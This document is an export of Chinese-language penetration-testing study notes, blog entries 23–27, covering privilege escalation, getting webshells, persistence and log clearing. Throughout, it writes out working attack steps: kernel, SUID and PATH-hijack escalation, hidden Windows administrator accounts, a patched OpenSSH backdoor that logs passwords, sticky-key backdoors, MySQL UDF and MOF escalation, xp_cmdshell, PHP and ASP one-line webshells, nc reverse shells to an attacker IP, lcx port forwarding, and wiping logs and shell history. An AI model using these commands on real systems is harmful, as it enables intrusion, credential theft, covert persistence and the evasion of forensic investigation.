    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B027-%E5%90%8E%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[Linux提权: 内核溢出提权 mysql udf提权 利用SUID提权 利用环境变量劫持高权限程序提权 内核溢出提权 查看内核 uname -r 反弹shell执行命令 上传exp 编译 执行 根据内核版本查找对应漏洞 收集exp 可以从www.exploit-db.com查找漏洞利用 rhel linux 先上传一个大马 #ifconfig #iptables -F #setenforce 0 大马-&gt;执行命令 uname -r 查看内核版本号 权限提升-&gt;linuxEXP-&gt;mempodipper2.6.39.c 大马-&gt;文件管理-&gt;上传 需要移动到tmp目录下,才能有权限 mempodipper2.6.39.c-&gt;改名a.c 大马-&gt;(#)cp /var/www/html/a.c /tmp/a.c ls /tmp 大马-&gt;Linux提权-&gt;反弹端口 本机nc -l -n -v -p 12345侦听 本机-&gt;ls /tmp whoami 是apache权限,比较小 cd /tmp gcc a.c (默认生成一个a.out) ls -l 查看是否有权限 chmod 777 a.out 对其附加权限 ./a.out 执行进行提权 whoami 回车 如果卡住的话,说明利用失败 mysql UDF提权 上传库文件 执行库文件创建命令执行函数 cracer官网去查看 要有一个udf.txt 大马-&gt;MYSQL提权-&gt;user/pw-&gt;复制32位的udf.txt代码-&gt;①(执行)(没有权限) # chmod 777 -R /usr/lib/mysql/plugin 设置权限 再执行①,就有权限执行了 select sys_eval(&apos;cat /etc/passwd&apos;); 漏洞利用-&gt;mysql提权工具-&gt;指定ip,外连测试 数据管理-&gt;开启root外链-&gt;第一条代码复制 大马-&gt;MYSQL-&gt;复制,执行成功后,就能外连了 mysql提权工具-&gt;udf提权 利用SUID提权 寻找系统里可以用的SUID文件来提权 $find / -perm -u=s -type f 2&gt;/dev/null 大马-&gt;执行命令-&gt;复制,$去掉 SUID是设置用户id,查看哪些文件是有SUID的,某些文件普通用户可以临时具有管理员权限. 我们发现nmap居然有SUID标志位,来看看nmap版本 nmap支持&quot;interactive&quot;选项,用户能够通过该选项执行shell命令,通常,安全人员会使用该命令来避免他们使用nmap命令被记录在history文件中 #nmap --interactive 因为nmap有SUID位,所以通过&quot;!sh&quot;我们会获取到一个root权限的shell #nmap&gt; !sh SUID普通用户也会有权限对其控制,相当于拥有root权限 -&gt;开一个执行命令的窗口 利用环境变量劫持高权限程序提权 第一步:查找可操作文件 $find/ -perm -u=s -type f 2&gt;/dev/null 第二步:利用file命令查看文件是否可执行 执行该文件 在执行的时候可能会报错,根据报错来查看调用系统命令 利用低权限用户目录下可被root权限用户调用的脚本提权 设置bash的$path环境变量 然而当我们调用cat命令的时候,cat会从以上目录来寻找,如果我们添加.到$PATH环境变量,则会先从当前目录来寻找cat指令. 新建cat,添加执行权限 这样当我们再次运行./msgmike命令的时候,就会触发当前目录下的cat(/bin/sh),从而提权. $ ls ls msgmike $ file msgmike $ ./msgmike ./msgmike cat: .....No such file or directory $ touch cat touch cat $ echo &quot;/bin/sh&quot; &gt; cat echo &quot;/bin/sh&quot; &gt; cat $ export PATH=&quot;.&quot; $ msgmike reg: 大马-&gt;执行命令-&gt;export PATH=&quot;.&quot; 大马-&gt;执行命令-&gt;echo &quot;/bin/bash&quot;&gt; ping 创建一个bean 后渗透攻击 维持访问 记录清除 综合利用 维持访问: 创建后门账号 安装后门程序 安装远控程序 安装Linux后门 Windows怎么创建后门? 答: net user cc 123.com /add net localgroup administrator cc /add net user cc net user guest /active:yes net user guest 123.com net localgroup administrator guest /add 建议用SUPPORT_338945a0 先登录进去,再创建隐藏账号,然后在删掉之前的就可以了 右键-&gt;我的电脑-&gt;管理-&gt;用户-&gt;右击3389-&gt;设置密码 属性-&gt;拨入-&gt;允许访问 regedit-&gt;SAM-&gt;右击属性-&gt;添加Everyone SAM-&gt;Domains-&gt;Account-&gt;Users-&gt;Names-&gt;找到对应的号,然后打开管理员那个而不是自己创建的那个-&gt;打开F-&gt;复制16进制数,找到自己创建的号的F,然后粘贴 然后虽然显示的是未连接,但是却可以远程连接这个账户了. 超级隐藏后门-&gt;权限提升-&gt;超级隐藏后门 安装后门用权限提升-&gt;sethc 按5次shift就可以***比较危险,容易全盘感染,杀毒软件都不管用 根据热键表 设置热键 reg:65,68 起名叫lpk lpk文件一般都是会调用的,首先调用同一级别目录的lpk 5次shift,再按热键,输入密码-&gt;可以调用cmd命令whoami 安装远程控制: 权限提升-&gt;sx(上兴,类似灰鸽子,大灰狼)-&gt;打开-&gt;地址要外网地址,是返回来连接攻击端的端口-&gt;生成,可以改名为qq.exe 内网的话,就端口转发 有个键盘记录. 可以监听 安装Linux后门: Linux,权限提升-&gt;linux后门工具上传上去 tar zxvf openssh-5.9p1.tar.gz tar zxvf 0x06-openssh-5.9p1.patch.tar.gz cd openssh-5.9p1.patch/ cp sshbd5.9.p1.diff ../openssh-5.9p1 cd ../openssh-5.9p1 patch &lt;sshbd5.9p1.diff //patch 后门 vi includes.h //修改后门密码,记录文件位置 /* +#define ILOG &quot;/tmp/ilog&quot; //记录登良路到本机的用户名和密码 +#define OLOG &quot;/tmp/olog&quot; //记录本机登录到远程的用户名和密码 +#define SECRETPW &quot;123456&quot; //你后门的密码 */ # ssh -v vi version.h //修改ssh版本信息,改成原来的,防止用户登录的时候察觉到 先安装所需环境不然会报错 yum install -y openssl openssl-devel pan devel ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 //通过源代码的安装,配置安装编译前的环境配置,源代码安装经常会报错 注意要是出现:configure:error:***zlib.h missing - please install first or check config.log 需要安装zlib yum install -y zlib zlib -devel http://sourceforge.net/projects/libpng/files/zlib/1.2.3/zlib-1.2.3.tar.gz/download需要make clean make &amp;&amp; make install //写一个就行 service sshd restart //重启sshd 然后我们登录ssh看看 cd - vi includes.h :wq cat /tmp/ilog //记录别人登录我 ssh 192.168.3.112 yes 123456 exit cat /tmp/olog //记录我登录的别人 记录清除 windows系统记录清除 Linux系统记录清除 扫描网站目录,会记录在哪里? 答:记录在网站日志文件中 虚拟主机:htdoc,log log记录网站访问日志,需要擦除相关日志 正常网站的话,reg:iis 百度:网站访问日志. 进行分析-&gt;如果不严重的话,在这个日志找不到你就会算了.但是如果很严重的话,怎么删都不行. 服务端电脑-&gt;管理-&gt;事件查看器-&gt;安全性-&gt;清记录 一般是: 日志+文件修改时间+权限 来进行判断的 数据恢复的也可以看到 Linux怎么查呢? 答: ls /var/log/httpd/ cat /var/log/httpd/access_log ls -l /var/www/html/ //查看网站的上传日期 touch * //将文件更新到最新 history //查看执行指令命令 history -c //清除指令命令]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记26-权限下]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B026-%E6%9D%83%E9%99%90%E4%B8%8B%2F</url>
    <content type="text"><![CDATA[远程管理软件提权 pcanywhere 访问pcanywhere默认安装目录 下载用户配置文件 通过破解账户密码文件 大马-&gt;pcanywhere-&gt;host/remotes-&gt;PCA admin CIF(远程登录用户的配置文件)-&gt;下载,并破解 权限提升-&gt;第三方工具提权-&gt;pcanywhere提权-&gt;进行破解 攻击端也要安装一个pcanywhere,添加下一步-&gt;连接的ip指定一下,勾选连接被控端 radmin提权 通过端口扫描 扫描4899端口 上传radmin.asp木马读取radmin的加密密文 使用工具连接 Radmin设置 安装服务,设置口令-&gt;启动 regedit-&gt;RAdmin 大马-&gt;RAdmin 第三方提权工具-&gt;Radmin-&gt;输入ip-&gt;输入大马得出的hash值 大小写转为小写 vnc提权 通过读取注册表十进制数 将得出的十进制数去掉第一个数,其他的转换成十六进制数 破解十六进制数得到密码 vncx4.exe -W 回车 输入转换后的十六进制数 连接vnc RealVNC启动 大马-&gt;读取注册表-&gt;VNC4密码 未有权限读的话,需要将权限提升 第三方软件提权-&gt;VNC4.exe vncx4.exe-&gt;vncx4.exe -W 输入(大马读取的数并转成16进制) -&gt;即:一个一个输入,要一个一个回车-&gt;输入完后自动出密码 溢出提权 主要是通过windows漏洞利用来获取系统权限 常见的溢出提权 巴西烤肉 pr 步骤: 1.通过信息收集查看服务器打了哪些补丁 2.根据未打补丁漏洞进行利用即可 systeminfo-&gt;查看补丁-&gt;K8补丁对比 工具-&gt;溢出提权,里面基本都是exe 先上传 大马-&gt;上传文件-&gt;找一个可读可写的目录 pr.exe-&gt;cmd执行一下漏洞路径 url &quot;whoami&quot; 不用pr,就是一个网络服务权限,用pr是system权限 破解hash提权 上传pwdump.exe运行获取hash值 拿到Ic5,彩虹表中破解 即可得到管理员密码 需要管理员权限方可执行读取hash操作 权限提升-&gt;getpass-&gt;getpass可以直接读取明文密码 权限提升-&gt;getpass-&gt;pwd-&gt;PwDump7.exe和libeay32.dll移到服务端 pwdump7.exe,没有权限是没有任何效果的 (可以用刚刚的pr来执行) pr.exe &quot;pwdump7.exe&quot; 破解第一行的最后一段16进制数就是密码 getpass-&gt;GetPass_cmd.exe/新建文件夹\pass.exe-&gt;读取明文 启动项提权 前提写入的目录需要写入权限 将批处理文件上传到开机启动项目录等待管理员重启即可 数据库提权 sqlserver数据库提权 MySQL数据库提权 需要具备数据库管理员权限才可执行提权操作 mssql提权 安装组件 开启3389 创建用户 提升权限 完成 sa账号的获取,去查看config.asp,conn.asp等文件 web.config mssql安装执行命令组件 安装cmd_shell组件 EXEC sp_configure &apos;show advanced options&apos;,1 GO RECONFIGURE GO EXEC sp_configure &apos;xp_cmdshell&apos;,1 GO RECONFIGURE GO 数据管理-&gt;K8MSSQL/sqltoos/MSSQL查询分析器 执行命令 net user/whoami 删除cmd_shell组件 EXEC sp_configure &apos;show advanced options&apos;,1 GO RCONFIGURE GO EXEC sp_configure &apos;xp_cmdshell&apos;,0 GO RECONFIGURE GO 3389操作语句 开启3389 exec master.dbo.xp_regwrite&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\CurrentControlSet\Control\Terminal Server&apos;,&apos;fDenyTSConnections&apos;,&apos;REG_DWORD&apos;,0;-- 关闭3389 exec master.dbo.xp_regwrite&apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\CurrentControlSet\Control\Terminal Server&apos;,&apos;fDenyTSConnections&apos;,&apos;REG_DWORD&apos;,1; 开启3389,之后就可以mstsc了 如果不能外连的话,只能是上传木马 大马-&gt;SQL-SA-&gt;user/pw-&gt;执行命令就行了 Mysql数据库提权 udf提权 启动项提权 mof提权 反连端口提权 udf提权 获取到对方的mysql数据库下的root账号密码 1.查看网站源码里面数据库配置文件 (inc,conn,config,sql,common,data等) 2.查看数据库安装路径下的user.myd(/data/mysql/) 3.暴力破解mysql密码破解3306端口入侵 udf提权原理: 通过root权限导出udf.dll到系统目录下,可以通过udf.dll调用执行cmd C:\Winnt\udf.dll 2000 C:\Windows\udf.dll 2003 现在基本上win的服务器就这两个导出UDF.DLL 5.1以上版本需要导出mysql安装目录lib\plugin\ create function cmdshell returns string soname &apos;udf.dll&apos; select cmdshell(&apos;net user cracer cracer /add&apos;); select cmdshell(&apos;net localgroup administrators cracer /add&apos;); drop function cmdshell;删除函数 权限提升-&gt;数据库提权-&gt;Mysql/mysql提权 访问这个php root/root create plugin dump udf create function 另外一款免杀的php,可以执行select sys_eval(&apos;whoami&apos;) 启动项提权 1.查看我们进入数据库中有些什么数据表 mysql&gt;show tables; 默认的情况下,test中没有任何表的存在. 以下为关键的部分 2.在TEST数据库下创建一个新的表; mysql&gt;create table a (cmd text); 好了,我们创建一个新的表,名为a,表中只存放一个字段,字段名为cmd,为text文本 3.在表中插入内容 mysql&gt;insert into a values(&quot;set wshshell=createobject(&quot;&quot;wscript.shell&quot;&quot;)&quot;); mysql&gt;insert into a values(&quot;a=wsshell.run(&quot;&quot;cmd.exe /c net user 1 1 /add&quot;&quot;,0)&quot;); mysql&gt;insert into a values(&quot;a=wsshell.run(&quot;&quot;cmd.exe /c net localgroup Administrators 1 /add&quot;&quot;,0)&quot;); 注意双引号和括号以及后面的&quot;0&quot;一定要输入!我们将用这三条命令来建立一个VBS的脚本程序. 4.表a中应该有3条数据 mysql&gt;select * from a 我们将会看到表中有三行数据,确认输入无误后,下一步 5.输出表为一个VBS的脚本文件 mysql&gt;select * from a into outfile &quot;c://docume~1//administrator//[开始]菜单//程序//启动//a.vbs&quot;; 6.重启即可! mof提权 第一种方法: 上传mof.php 输入相关信息,执行命令,提权 第二种方法: 上传文件x.mof 使用select命令导出入到正确位置 select load_file(&apos;C:/wmpub/nullevt.mof&apos;) into dumpfile &apos;c:/windows/system32/wbem/mof/nullect.mof&apos; 允许外部地址使用root用户连接的sql语句 Grant all privileges on *.* to &apos;root&apos;@&apos;%&apos; identified b &apos;root&apos; with grant option; 访问mof.php 先Exploit 才能执行命令 php-&gt;大马-&gt;nosafe/test/testa 访问登录后就可以执行sql语句了,要有权限才能执行更多 反链端口提权 利用mysql客户端工具连接mysql服务器 ,然后执行下面的操作 执行命令 mysql.exe -h 172.16.10.11 -uroot -p Enter password: mysql&gt;\.c:\mysql.txt mysql&gt;select backshell(&quot;YourIP&quot;,2010); 2.本地监听你反弹的端口 nc.exe -vv -l -p 2010 成功后,你将获得一个system权限的cmdshell,其实这个也是利用的UDF提权 服务器端反连接黑客端,然后开另一个端口来进行监听,就可以对服务器端进行操作了 udf-&gt;创建反弹函数-&gt;执行反弹 select backshell(&apos;本机ip&apos;,端口12345) 权限提升-&gt;端口转发-&gt;nc.rar nc.exe nc -l -p 12345 如果有防火墙的时候可以使用反弹 防火墙会拦截外网,一般不会拦截内网 内网端口转发 内网主机输入命令: lcx.exe -slave 外网ip 外网端口 内网ip 内网端口 lcx.exe -slave 192.168.0.104 1111 127.0.0.1 3389 外网主机输入命令 lcx.exe -listen 1111 1311 外网要路由器的端口映射到内网的某台电脑上 DMZ主机一般比较安全 虚拟服务器,xx端口,会给x.x.x.x的ip映射 一定要连接内网某一端口的话,需要端口转发 大马-&gt;执行cmd-&gt;那个有 -tran的那个执行上方命令 权限提升-&gt;端口转发-&gt;lcx cmd-&gt;lcx.exe -listen 1111 1311 mstsc 127.0.0.1:1311 开启3389 使用 批处理文件开3389 使用sql语句开3389 使用exe开3389 使用vb开3389 一些命令利用 type E:\wwwroot\Web.config 查看文件内容 cacls命令 /T:更改当前目录及其所有子目录中指定文件的ACL /E:编辑ACL而不替换 /C:在出现拒绝访问错误时继续 /G Userer:perm:赋予指定用户访问权限,Perm代表不同级别的访问权限,其值可以是R(读取),w(写入),c(更改,写入),F(完全控制)等. /R user:撤销指定用户的访问权限,注意该参数仅在与&quot;/E&quot;一起使用时有效 cacls C:\wwwroot\1.htm /t /e /c /g interactive:f 要修改一个文件的权限的必要条件 要有USERS组的完全控制权限 CMD权限]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记25-权限提升]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B025-%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%2F</url>
    <content type="text"><![CDATA[帝国-&gt; 系统-&gt;数据表与系统模型-&gt;管理数据表-&gt;管理系统模型-&gt;导入 xx.php.mod &lt;?fputs(fopen(&quot;cao.php&quot;.&quot;w&quot;),&quot;&lt;?eval(\$_POST[cmd]);?&gt;&quot;)?&gt; phpcms 界面-&gt;模板风格-&gt;search-&gt;修改,可视化-&gt;一句话 内容-&gt;选择附件上传-&gt;图片 系统设置-&gt;Ucenter api-&gt;一句话(要闭合) 00截断,存在注入漏洞 admin&apos; or &apos;1&apos; = &apos;1 提权 提权前的号角 windows提权 Linux提权 什么是提权: 主要针对网站测试过程中当测试某一网站时,通过各种漏洞提升WEBSHELL权限已夺得改服务器权限 入侵B网站,但是想跨A网站,需要提权 通常脚本所处的权限 ASP/php 匿名权限 ASPx USER权限 jsp通常是系统权限 Tomcat一般是管理员权限,或者system权限 setp c:\windows\system32\cmd.exe ipconfig/tasklist/arp -a 不能实现,,这时需要上传aspx大马 在菜刀-&gt;大马上边执行cmd.exe asp大马如果不知道密码的话,用?profile=a 收集信息 内外网 服务器系统和版本位数 服务器的补丁情况 服务器的安装软件情况 服务器的防护软件情况 端口情况 支持脚本情况 .... arp如果是静态,就没必要欺骗,动态C段才需要欺骗 信息收集常用命令 windows: ipconfig/all 查看当前ip net user 查看当前服务器账号情况 netstat -ano 查看当前服务器端口开发情况 ver 查看当前服务器操作系统 systeminfo 查看当前服务器配置信息(补丁情况) tasklist /svc 查看当前服务器进程情况 taskkill -PID pid好 结束某个pid进程 taskkill /im qq.exe /f 结束qq进程 net user cracer cracer /add 添加一个用户名为cracer密码为cracer的用户 net localgroup administrators cracer /add 将用户cracer添加到管理员组 whoami 查看当前操作用户(当前权限) Linux: Is -al 查看当前目录下的文件和文件夹 pwd 查看当前操作路径 uname -a查看当前服务器内核信息 cmd命令执行 1.防护软件拦截 2.cmd被降权 3.组件被删除 找可读写目录上传cmd.exe,将执行的cmd.exe路径替换成上传的路径,再次调用执行 查找3389 1.注册表读取 大马可以直接读注册表 2.工具扫描 3.命令探针 WINDOWS提权: 第三方软件提权 溢出提权 启动项提权 破解hash提权 数据库提权 常见的第三方软件提权 FTP软件:(服务器一般都是上传软件) server-u,g6ftp,FileZilla 远程管理软件 PCanywhere,radmin,vnc server-u提权 有修改权限 0检查是否有可写权限 修改server-u默认安装目录下的ServUDaemon.ini 1.增加用户 2.连接 3.执行命令 quote site exec net user cracer cracer.com /add quote site exec net localgroup administrators cracer /add 无修改权限 暴力破解md5 溢出提权 大马-&gt;ServU-&gt;SerevUDaemon.ini,如果不能保存,就破解它的密码 ftp&gt;quote site exec +系统命令 win+R-&gt;mstsc-&gt;登录创建的用户 md5加密:zp123 溢出提权-&gt; 大马-&gt;Server-提权-&gt;自动创建一个DiskKill用户 忘记密码的话,找到serverUadmin.exe下载下来,然后打开代码审计-&gt;C32-&gt;拖进来,16进制-&gt;右键搜索-&gt;ANSII-&gt;搜索用户名 G6ftp提权 下载管理配置文件,将administrator管理密码破解 使用Icx端口转发(默认只允许本机连接) lcx.exe -tran 8027 127.0.0.1 8021 使用客户端以管理员用户登录 创建用户并设置权限和执行的批处理文件 上传批处理 以创建的普通用户登录ftp 执行命令quote site x.bat x.bat内容为添加系统用户 提权 (需要上传一个lcx.exe) www.shodan.io -&gt;搜索 弱口令/默认密码 filezilla提权 filezilla是一款开源的FTP服务器和客户端的软件 若安装了服务器端默认只侦听127.0.0.1的14747端口 并且默认安装目录下有两个敏感文件filezillaserver.xml(包含了用户信息)和filezillaserver interface.xml(包含了管理信息) 提权思路: 下载这两个文件,拿到管理密码 配置端口转发,登录远程管理ftpserver,创建ftp用户 分配权限,设置家目录为C:\ 使用cmd.exe改名为sethc.exe替换c:\windows\system32\sethc.exe生成shift后门 连接3389按5次shift调出cmd.exe 大马-&gt;(1)Program-&gt;filezilla-&gt;执行cmd 站点根目录-&gt;data-&gt;复制路径 netstat -an | find &quot;14147&quot; 权限提升-&gt;端口转发-&gt;lcx.exe-&gt;上传-&gt;复制url cmd-&gt;粘贴url-&gt;url -tran 14148 127.0.0.1 14147 将14147转发成任意机器的14148地址 将第三方软件提权的文件复制到VM里,先安装filezilla 连接到192.168.0.10 14148 新建用户 客户端直接执行就行 192.168.0.10 user pw /windows/system32/sethc替换 mstsc-&gt;5次shift explorer.exe 或者创建新用户]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记24-getshell方法总结]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B024-getshell%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[getshell方法总结(webshell) 管理权限拿webshell 普通权限拿webshell 常见cms拿shell 管理权限拿shell: 需要有管理员权限才可以拿shell 通常需要登录后台后执行相关操作 直接上传拿shell 数据库备份拿shell 网站对上传的文件后缀进行过滤,不允许上传脚本类型文件如asp/php/jsp/aspx等. 而网站具有数据库备份功能,这时我们就可以将webshell格式先改为允许上传的文件格式,如果jpg,gif等. 然后我们找到上传后的文件录,通过数据库备份,将文件备份为脚本格式. 备份之后不需要加.asa 突破上传拿shell 本地js验证上传 服务器mime上传 服务器白名单上传 服务器黑名单上传 服务器filepath上传 双文件上传 %00截断上传-&gt;ctrl+shift+u 上传其他脚本类型拿webshell {year}{mm-dd-hh}.jpg a.asp;.{year}{mm-dd-hh}.jpg 修改网站上传类型配置拿shell 有的网站,在网站上传类型中限制了上传脚本类型文件,我们可以去添加上传文件类型如添加asp|php|jsp|aspx|asa来拿webshell (一般指在编辑器里面) 利用解析漏洞拿webshell 1.IIS 5.x/6.0解析漏洞 2.IIS 7.0/IIS 7.5/Nginx&lt;8.03畸形解析漏洞 3.Nginx&lt;8.03空字节代码执行漏洞 4.Apache解析漏洞 reg: a.asp/1.jpg a.cer a.asa a.asp;.jpg 1.jpg/a.php a.php%00.jpg Apache漏洞一般是: aa.php.zzz.ccc 利用编辑器漏洞拿webshell 常见的编辑器有fckeditor,ewebeditor,cheditor等 reg: admin_uploadfile.asp?id=&amp;dir=../.. 网站配置插马拿webshell 通过找到网站默认配置,将一句话插入到网站配置中,不过为了能够成功执行插马,建议先下载该网站源码,进行查看源码过滤规则,以防插马失败 &quot;%&gt;&lt;%eval request(&quot;cracer&quot;)%&gt;&lt;%&apos; 一般有这个inc/config.asp文件的都可以这样插入 一般在后台-&gt;网站名称,网站标题等地方 通过编辑模板拿webshell 1.通过对网站的模板进行编辑写入一句话,然后生成脚本文件拿webshell 2.通过将木马添加到压缩文件,把名字改为网站模板类型,上传到网站服务器,拿webshell SQL-&gt;use master/mysql 爆路径 模板管理-&gt;库项目管理-&gt;配送方式&lt;一句话&gt; 库项目管理的.lbi改成.php 就可以访问了 上传插件拿shell 一些网站为了增加某些功能会在后台添加一些插件来实现,我们可以把木马添加到安装的插件中上传服务器拿shell 常见的有博客类网站,dz论坛都可以 reg:wordpress,emlog,zblog,dz 插件-&gt;安装插件,在插件里面放一个木马 会上传在wp-content-&gt;plugins-&gt;插件 访问这个木马就可以了 数据库执行拿webshell 我们可以通过数据库执行命令导出一句话到网站根目录拿shell access数据库导出一般需要利用解析漏洞xx.asp;.xml sqlserver导出 ;exec%20sp_makewebtask%20%20%27c:\inetpub\wwwroot\ms\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27-- (前提权限要够) mysql命令导出shell Create TABLE study(cmd text NOT NULL); Insert INTO study (cmd) VALUES(&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;); select cmd from study into outfile &apos;D:/php/www/htdocs/test/seven.php&apos; Drop TABLE EXISTS study; 版本二 use mysql; create table x(packet text) type=MYISaM; insert into x (packet) values(&apos;&lt;pre&gt;&lt;body&gt;&lt;?php @system($_GET[&quot;cmd&quot;]);?&gt;&lt;/body&gt;&lt;/pre&gt;&apos;) select into outfile &apos;d:\php\xx.php&apos; 版本三 select &apos;&lt;?php eval($_POST[cmd]);?&gt;&apos; into outfile &apos;C:/inetpub/wwwroot/mysql-php/1.php&apos; 文件包含拿webshell 先将webshell改为txt文件上传,然后上传一个脚本文件包含该txt文件,可绕过waf拿webshell asp包含 1.&lt;!--#include file=&quot;123.jpg&quot;--&gt; 2.调用的文件必须和被调用的文件在同一目录,,否则找不到 3.如果不在同一目录,用下面的语句: &lt;!--#include virtual=&quot;文件所在目录/123.jpg&quot;--&gt; php包含 &lt;?php include(&apos;123.jpg&apos;); ?&gt; (这样可以绕waf) 命令执行拿shell Echo ^&lt;^?php @eval($_POST[&apos;cracer&apos;]);?^&gt;^ &gt;c:\1.php Echo ^&lt;^?php @eval($_POST[&apos;cracer&apos;]);?^&gt;^ &gt;c:\1.php ^&lt;^%eval request(&quot;cracer&quot;)%^&gt;^ &gt;c:\1.php 普通用户前台拿shell 0day拿webshell IIS写权限拿webshell 命令执行拿webshell 通过注入漏洞拿webshell 前台用户头像上传拿webshell struts2拿webshell java反序列拿shell 工具iisput可以扫描,扫到之后用write工具写入 先put,再MOVE命令重命名 头像上传,记准上传路径 抓包的一堆电脑编码替换掉:选中,然后右击粘贴来自于文件 常见cms拿shell 良精,科迅,动易,aspcms dz 米拓cms phpcms2008 帝国cms phpwind9.0 phpv9 phpweb dedecms reg:IIS6.0漏洞:a.asp;html]]></content>
      <categories>
        <category>技能</category>
        <category>编程</category>
        <category>后端</category>
        <category>渗透</category>
        <category>基础</category>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>编程</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透测试学习笔记23-其他漏洞二]]></title>
    <url>%2F2018%2F09%2F11%2F%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B023-%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E%E4%BA%8C%2F</url>
    <content type="text"><![CDATA[jsp相关漏洞 ST2漏洞 反序列漏洞 其他漏洞 Struts2漏洞 struts是Apache基金会Jakarta项目组的一个开源项目,Struts通过采用Java Servlet/JSP技术,实现了基于Java EE Web应用的ModelView-Controller(MVC)设计模式的应用框架,是MVC经典设计模式中的一个经典产品.目前,Struts广泛应用于大型互联网企业,政府,金融机构等网站建设,并作为网站开发的底层模板使用,是应用最广泛的Web应用框架之一. 漏洞挖掘: 单个目标站进行测试: 工具爬行 找到存在漏洞地址reg: xx.action 用相关工具进行测试即可. XAMPP Control Panel v3.2.2 漏洞利用-&gt;K8-&gt;先漏洞探测-&gt;再执行命令 net user guest /acitve:yes ftp,远程木马 oa do一般都是java编写的,一般去主页里的其它网址 正方教务一般都是aspx,oa一般指向action admin admin 批量扫描action: 信息收集-&gt;url采集-&gt;导入-&gt;struts2 Struts2漏洞应用工具批量验证 Sta2-045.py脚本,将url复制到字典里面 需要手动导,方式:安装pip,然后install from poster.encode import multipart_encode from poster.streaminghttp import register_openers cmd-&gt;Sta2.045.py 3.txt whoami java反序列漏洞 2015年的1月28日,Gabriel Lawrence(@gebl)和Chris Frohosff(@frohoff)在AppSecCali上给出了一个报告,报告汇总介绍了java反序列化漏洞可以利用Apache Commons Collections这个常用的java库来实现任意代码执行,当时并没有引起太大的关注. 2015年11月6月,FoxGlove Security安全团队的@breenmachine发布的一篇博客中介绍了如何利用java反序列化漏洞,来攻击最新版的WebLogic,WebSphere,JBoss,Jenkins,OpenNMS这些java应用,实现远程代码执行.(web中间件,类似tomcat) java反序列化漏洞简介: 序列化就是把对象转换成字节流,便于保存在内存,文件,数据库中;反序列化即逆过程,由字节流还原成对象.java中的ObjectOutputStream类的writeObject()方法可以实现序列化,类ObjectInputStream类的readObject()方法用于反序列化. 其它漏洞:(中间件) tomcat部署漏洞: 访问tomcat manager页面 尝试弱口令爆破 登录管理页面 部署war文件 得到shell java反序列化终极测试工具: By STG-6哥 探测-&gt;url 密码攻击-&gt;Apache 在apache首页下面有一个war部署, webshell-&gt;大马-&gt;jsp-&gt;war上传 点进去登录访问. weblogic攻击 批量扫描WebLogic缺省的WEB管理端口(http为7001,https为7002),开放这两个端口的一般都是安装有WebLogic的主机 2.Google搜索关键字&quot;WebLogic Server Administration Console inurl:console&quot;,URL后面是console结尾的,一般为目标. 在找到的目标url后面加上console,回车就会自动跳转到管理登录页面 尝试若口令登录: 1.用户名密码均为:weblogic 2.用户名密码均为:system 3.用户名密码均为 :portaladmin 4.用户名密码均为:guest 登录后找到&quot;mydomain&quot;-&gt;&quot;Deployments&quot;-&gt;&quot;Web Application Modules&quot;-&gt;&quot;Deploy new Web Application Module...&quot; 再点里面的&quot;upload your file(s)&quot;,在跳转后的页面上传war包(war包和Tomact弱口令利用的包一样,注意马的免杀即可) tomact是manager文件夹,weblogic是console文件夹 其他漏洞详解: 越权漏洞 逻辑漏洞 其他漏洞 越权漏洞: 类型划分: 水平越权 水平越权是指同等权限级别的越权 纵向越权 纵向越权是指不同等权限级别的越权 越权漏洞挖掘: 漏洞出现点: 数据交互的地方 用户可操作的地方 参数可控制的地方 越权挖掘实例 密码修改越权 Metinfo4这个版本存在越权漏洞 抓登录后的修改个人信息数据包 将useid=&apos;&apos;改成另一个用户名,就会在另一个用户那边修改成功 也可以将密码重设提交 逻辑漏洞: 逻辑漏洞分类 逻辑密码找回 逻辑支付漏洞 莱趣商城 微信手机话费充值,用嗅探欺骗-&gt;fidder,或者burp burp添加一个代理,指定一个ip地址,,192.168.0.102 有选项,能抓https,有证书加密的,没法利用 挖掘: 漏洞出现点 数据交互的地方 用户可操作的地方 参数可控制的地方 SSRF(Server-Side Request Forgery):服务器端请求伪造: 